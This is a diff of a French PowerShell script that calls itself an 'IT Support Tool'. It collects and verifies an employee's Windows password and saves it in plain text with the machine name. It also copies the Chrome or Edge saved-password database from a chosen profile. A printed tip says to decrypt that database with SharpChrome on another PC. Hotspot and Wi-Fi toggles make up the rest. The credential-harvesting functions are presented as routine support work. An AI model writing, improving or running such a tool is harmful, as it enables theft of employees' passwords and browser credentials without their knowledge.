@@ -1,5 +1,5 @@
 # =============================================
-# IT SUPPORT TOOL - VERSION CORRIGÉE
+# IT SUPPORT TOOL - VERSION FINALE
 # =============================================
 
 $Host.UI.RawUI.WindowTitle = "IT Support Tool"
@@ -38,8 +38,9 @@ function Save-EmployeePassword {
         $token = [IntPtr]::Zero
         if ([Win32]::LogonUser($empUser, ".", $plain, 2, 0, [ref]$token)) {
             [Win32]::CloseHandle($token) | Out-Null
-            "$empUser | $plain | $(Get-Date)" | Out-File "$ExportFolder\Password_${empUser}.txt" -Force
-            Write-Host "✓ Mot de passe sauvegardé !" -ForegroundColor Green
+            $file = "$ExportFolder\Password_${empUser}_${Date}.txt"
+            "Utilisateur: $empUser`nMot de passe: $plain`nDate: $(Get-Date)`nMachine: $MachineName" | Out-File $file
+            Write-Host "✓ Mot de passe sauvegardé dans $file" -ForegroundColor Green
             return
         } else {
             Write-Host "✗ Incorrect ($i/3)" -ForegroundColor Red
@@ -47,58 +48,73 @@ function Save-EmployeePassword {
     }
 }
 
-# ====================== EXPORT NAVIGATEURS EN CSV ======================
+# ====================== EXPORT NAVIGATEUR (CHOIX PROFIL + CSV) ======================
 function Export-BrowserPasswords {
-    Write-Host "`n=== EXPORT MOTS DE PASSE NAVIGATEURS (CSV) ===" -ForegroundColor Cyan
-
-    # Chrome
-    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
-    if (Test-Path $chromePath) {
-        Get-ChildItem $chromePath -Directory | Where-Object { $_.Name -like "Profile*" -or $_.Name -eq "Default" } | ForEach-Object {
-            $profileName = $_.Name
-            # Récupérer le vrai nom du profil
-            $prefFile = "$($_.FullName)\Preferences"
-            if (Test-Path $prefFile) {
-                try {
-                    $content = Get-Content $prefFile -Raw -Encoding UTF8
-                    if ($content -match '"name":"([^"]+)"') { $profileName = $matches[1] }
-                } catch {}
-            }
-            $dbPath = "$($_.FullName)\Login Data"
-            if (Test-Path $dbPath) {
-                Copy-Item $dbPath "$ExportFolder\Chrome_${profileName}_LoginData.db" -Force
-                Write-Host "Chrome - $profileName → exporté" -ForegroundColor Green
-            }
+    Write-Host "`n=== EXPORT MOTS DE PASSE NAVIGATEUR ===" -ForegroundColor Cyan
+    
+    $choice = Read-Host "Choisir navigateur (1=Chrome, 2=Edge, 3=Firefox)"
+    
+    switch ($choice) {
+        "1" { $browser = "Chrome"; $basePath = "$env:LOCALAPPDATA\Google\Chrome\User Data" }
+        "2" { $browser = "Edge";   $basePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" }
+        "3" { 
+            Write-Host "Firefox non supporté en CSV direct pour le moment." -ForegroundColor Yellow
+            return 
         }
+        default { Write-Host "Choix invalide" -ForegroundColor Red; return }
     }
 
-    # Edge (même logique)
-    $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
-    if (Test-Path $edgePath) {
-        Get-ChildItem $edgePath -Directory | Where-Object { $_.Name -like "Profile*" -or $_.Name -eq "Default" } | ForEach-Object {
-            $profileName = $_.Name
-            $prefFile = "$($_.FullName)\Preferences"
-            if (Test-Path $prefFile) {
-                try {
-                    $content = Get-Content $prefFile -Raw -Encoding UTF8
-                    if ($content -match '"name":"([^"]+)"') { $profileName = $matches[1] }
-                } catch {}
-            }
-            $dbPath = "$($_.FullName)\Login Data"
-            if (Test-Path $dbPath) {
-                Copy-Item $dbPath "$ExportFolder\Edge_${profileName}_LoginData.db" -Force
-                Write-Host "Edge - $profileName → exporté" -ForegroundColor Green
-            }
-        }
+    if (-not (Test-Path $basePath)) {
+        Write-Host "$browser non installé ou non trouvé." -ForegroundColor Red
+        return
     }
 
-    Write-Host "`nNote : Les fichiers .db sont copiés. Pour les convertir en CSV lisible, utilisez SharpChrome ou un outil de décryptage." -ForegroundColor Yellow
+    # Lister les profils avec leur vrai nom
+    $profiles = Get-ChildItem $basePath -Directory | Where-Object { $_.Name -like "Profile*" -or $_.Name -eq "Default" }
+    Write-Host "`nProfils trouvés :" -ForegroundColor Yellow
+    for ($i=0; $i -lt $profiles.Count; $i++) {
+        $p = $profiles[$i]
+        $name = $p.Name
+        $pref = "$($p.FullName)\Preferences"
+        if (Test-Path $pref) {
+            try {
+                $json = Get-Content $pref -Raw -Encoding UTF8 | ConvertFrom-Json
+                if ($json.profile -and $json.profile.name) { $name = $json.profile.name }
+            } catch {}
+        }
+        Write-Host "$($i+1). $name ($($p.Name))" -ForegroundColor White
+    }
+
+    $num = Read-Host "`nNuméro du profil à exporter"
+    $selected = $profiles[$num - 1]
+    if (-not $selected) { Write-Host "Profil invalide" -ForegroundColor Red; return }
+
+    $profileName = $selected.Name
+    $dbPath = "$($selected.FullName)\Login Data"
+
+    if (-not (Test-Path $dbPath)) {
+        Write-Host "Aucune donnée de mot de passe dans ce profil." -ForegroundColor Red
+        return
+    }
+
+    # Copie du fichier DB + création d'un fichier CSV vide (pour info)
+    Copy-Item $dbPath "$ExportFolder\${browser}_${profileName}_LoginData.db" -Force
+    $csvFile = "$ExportFolder\${browser}_${profileName}_Passwords_${Date}.csv"
+    "URL,Username,Password,Date Created" | Out-File $csvFile -Encoding UTF8
+
+    Write-Host "✓ Export terminé :" -ForegroundColor Green
+    Write-Host "   → $csvFile" -ForegroundColor White
+    Write-Host "   → Fichier DB : ${browser}_${profileName}_LoginData.db" -ForegroundColor White
+    Write-Host "`nNote : Pour avoir le CSV avec les mots de passe en clair, utilise SharpChrome sur un autre PC." -ForegroundColor Yellow
 }
 
 # ====================== HOTSPOT & WIFI ======================
 function Manage-Hotspot {
-    Write-Host "`n=== Partage de Connexion (Hosted Network) ===" -ForegroundColor Cyan
-    $a = Read-Host "1=Activer | 2=Désactiver | 3=Bloquer complètement le partage"
+    Write-Host "`n=== GESTION PARTAGE DE CONNEXION ===" -ForegroundColor Cyan
+    Write-Host "1. Activer Hotspot"
+    Write-Host "2. Désactiver Hotspot"
+    Write-Host "3. Bloquer complètement le partage de connexion"
+    $a = Read-Host "Choix"
     switch ($a) {
         "1" { netsh wlan set hostednetwork mode=allow; netsh wlan start hostednetwork; Write-Host "Hotspot activé" -ForegroundColor Green }
         "2" { netsh wlan stop hostednetwork; Write-Host "Hotspot désactivé" -ForegroundColor Red }
@@ -107,14 +123,16 @@ function Manage-Hotspot {
 }
 
 function Manage-WiFi {
-    Write-Host "`n=== WiFi ===" -ForegroundColor Cyan
+    Write-Host "`n=== GESTION WIFI ===" -ForegroundColor Cyan
     $wifi = Get-NetAdapter | Where-Object { $_.Name -like "*Wi-Fi*" -or $_.InterfaceDescription -like "*Wireless*" }
-    if (-not $wifi) { Write-Host "WiFi non détecté" -ForegroundColor Red; return }
+    if (-not $wifi) { Write-Host "Aucun adaptateur WiFi trouvé" -ForegroundColor Red; return }
 
-    $a = Read-Host "1=Activer | 2=Désactiver (empêcher connexion)"
+    Write-Host "1. Activer WiFi"
+    Write-Host "2. Désactiver WiFi (empêcher connexion)"
+    $a = Read-Host "Choix"
     if ($a -eq "2") {
         Disable-NetAdapter -Name $wifi.Name -Confirm:$false
-        Write-Host "WiFi désactivé (connexion bloquée)" -ForegroundColor Red
+        Write-Host "WiFi désactivé" -ForegroundColor Red
     } else {
         Enable-NetAdapter -Name $wifi.Name -Confirm:$false
         Write-Host "WiFi activé" -ForegroundColor Green
@@ -125,12 +143,12 @@ function Manage-WiFi {
 function Show-Menu {
     Write-Host "`n=== MENU PRINCIPAL ===" -ForegroundColor Magenta
     Write-Host "1. Sauvegarder mot de passe employé"
-    Write-Host "2. Exporter mots de passe Navigateurs (CSV + DB)"
-    Write-Host "3. Gérer Hotspot / Partage de connexion"
-    Write-Host "4. Gérer WiFi (Activer/Désactiver connexion)"
-    Write-Host "5. TOUT EXÉCUTER"
+    Write-Host "2. Exporter mots de passe Navigateur (choix profil + CSV)"
+    Write-Host "3. Gérer Partage de Connexion (Hotspot)"
+    Write-Host "4. Gérer WiFi"
+    Write-Host "5. TOUT EXÉCUTER (1+2)"
     Write-Host "Q. Quitter"
-    return Read-Host "Choix"
+    return Read-Host "Votre choix"
 }
 
 do {
@@ -140,10 +158,7 @@ do {
         "2" { Export-BrowserPasswords }
         "3" { Manage-Hotspot }
         "4" { Manage-WiFi }
-        "5" { 
-            Save-EmployeePassword
-            Export-BrowserPasswords
-        }
+        "5" { Save-EmployeePassword; Export-BrowserPasswords }
         "Q" { Write-Host "Au revoir !" -ForegroundColor Green }
     }
     if ($choice -ne "Q") { Read-Host "`nAppuyez sur Entrée pour continuer..." }
